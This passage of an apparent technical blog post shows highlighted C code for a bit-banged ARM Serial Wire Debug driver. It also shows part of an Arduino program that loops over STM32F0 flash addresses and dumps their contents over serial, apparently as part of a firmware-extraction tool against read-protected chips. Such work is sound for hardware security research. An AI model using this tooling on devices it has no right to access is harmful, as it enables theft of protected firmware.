        <span class="k">if</span> <span class="p">((</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">MWAIT</span><span class="p">;</span>

        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">INPUT</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
        <span class="n">cdata</span> <span class="o">|=</span> <span class="n">digitalRead</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">)</span> <span class="o">?</span> <span class="mh">0x80u</span> <span class="o">:</span> <span class="mh">0x00u</span><span class="p">;</span>
        <span class="n">data</span><span class="p">[(((</span><span class="n">len</span> <span class="o">+</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1u</span><span class="p">]</span> <span class="o">=</span> <span class="n">cdata</span><span class="p">;</span>

        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>

        <span class="cm">/* clear buffer after reading 8 bytes */</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="cm">/* 50 clk+x */</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">50u</span> <span class="o">+</span> <span class="mi">10u</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">portSel</span> <span class="o">==</span> <span class="n">swdPortSelectAP</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span> <span class="cm">/* Access AP */</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">adir</span> <span class="o">==</span> <span class="n">swdAccessDirectionRead</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x04u</span><span class="p">;</span> <span class="cm">/* read access */</span>
    <span class="p">}</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">A32</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mh">0x01u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x08u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="mh">0x02u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x10u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="mh">0x03u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x18u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="nl">default:</span>
        <span class="k">case</span> <span class="mh">0x00u</span><span class="p">:</span>

            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">header</span><span class="p">,</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5u</span><span class="p">;</span>
    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x01u</span><span class="p">;</span> <span class="cm">/* startbit */</span>
    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x80u</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">resp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionRead</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>

    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>

    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_READ_TURN</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">data1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionWrite</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="n">swdTurnaround</span><span class="p">();</span>

    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>

    <span class="n">swdDataIdle</span><span class="p">();</span>

    <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="n">data1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">24u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">8u</span> <span class="o">*</span> <span class="mi">4u</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>

    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdReadIdcode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idCode</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">ret</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">idCode</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSelectAPnBank</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">ap</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">bank</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">data</span> <span class="o">=</span> <span class="mh">0x00000000u</span><span class="p">;</span>

    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">ap</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">;</span>
    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">bank</span> <span class="o">&amp;</span> <span class="mh">0x0Fu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* write to select register */</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x02u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSetAP32BitMode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="n">d</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x07u</span><span class="p">);</span>
    <span class="n">d</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">d</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSelectAHBAP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdReadAHBAddr</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdEnableDebugIF</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="mh">0x50000000u</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdInit</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idcode</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdReset</span><span class="p">();</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadIdcode</span><span class="p">(</span><span class="n">idcode</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="maincpp">main.cpp</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">&lt;Arduino.h&gt;</span><span class="cp">
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>
    <span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>    <span class="cp">#include</span> <span class="cpf">"reader.h"</span><span class="cp">
</span><span class="p">}</span>

<span class="c1">// STM32 target flash memory size in bytes</span>
<span class="kt">uint32_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">32768</span><span class="p">;</span>

<span class="c1">// Usually the STM32F0x starts here.</span>
<span class="c1">// If you're trying to dump another series check the datasheet.</span>
<span class="kt">uint32_t</span> <span class="n">flashAddress</span> <span class="o">=</span> <span class="mh">0x08000000</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>

    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>

    <span class="n">targetInit</span><span class="p">();</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">Serial</span><span class="p">.</span><span class="n">available</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Send anything to start..."</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Starting"</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">status</span> <span class="o">=</span> <span class="n">extractFlashData</span><span class="p">(</span><span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flashData</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Error reading: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
